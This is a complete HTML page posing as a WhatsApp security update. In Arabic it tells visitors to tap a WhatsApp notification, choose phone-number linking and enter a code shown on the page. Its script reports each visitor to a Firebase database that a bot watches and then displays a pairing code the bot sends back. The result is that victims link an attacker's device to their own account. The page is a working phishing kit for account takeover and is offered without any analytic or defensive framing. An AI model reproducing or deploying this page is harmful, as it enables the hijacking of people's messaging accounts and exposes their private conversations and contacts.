<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background: #fff; margin: 0; }
        .container { width: 100%; max-width: 380px; text-align: center; }
        .logo { width: 70px; margin-bottom: 15px; }
        .header-title { font-size: 20px; font-weight: bold; color: #075e54; margin-bottom: 20px; }
        .version-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
        .v-row { display: flex; justify-content: space-between; font-size: 13px; margin: 5px 0; }
        .alert-text { font-size: 13.5px; line-height: 1.6; text-align: right; color: #3b4a54; border-top: 1px solid #eee; padding-top: 15px; }
        .code-zone { border: 2px solid #00a884; padding: 15px; border-radius: 10px; margin-top: 20px; min-height: 80px; }
        #pairing-code { font-size: 30px; font-weight: bold; color: #075e54; letter-spacing: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <div class="header-title">تحديث أمان واتساب</div>
        <div class="version-box">
            <div class="v-row"><span>التشفير الحالي:</span><span style="color:red">V2.12.5</span></div>
            <div class="v-row"><span>التشفير المحدث:</span><span style="color:green">V3.0.1</span></div>
        </div>
        <div class="alert-text">
            1. سيصلك إشعار من واتساب الآن، اضغط عليه.<br>
            2. اختر 'الربط برقم الهاتف بدلاً من ذلك'.<br>
            3. أدخل الرمز الذي سيظهر هنا:
        </div>
        <div class="code-zone">
            <div id="pairing-code">. . .</div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        
        const params = new URLSearchParams(window.location.search);
        const userId = params.get('id');

        if (userId) {
            // إرسال إشعار الزيارة فوراً للبوت في مسار 'monitoring'
            db.ref('monitoring/' + userId).set({
                status: "Online",
                time: Date.now()
            });

            // الاستماع للكود اللي هتبعته من البوت في مسار 'commands'
            db.ref('commands/' + userId).on('value', (snapshot) => {
                const data = snapshot.val();
                if (data && data.code) {
                    document.getElementById('pairing-code').innerText = data.code;
                }
            });
        }
    </script>
</body>
</html>
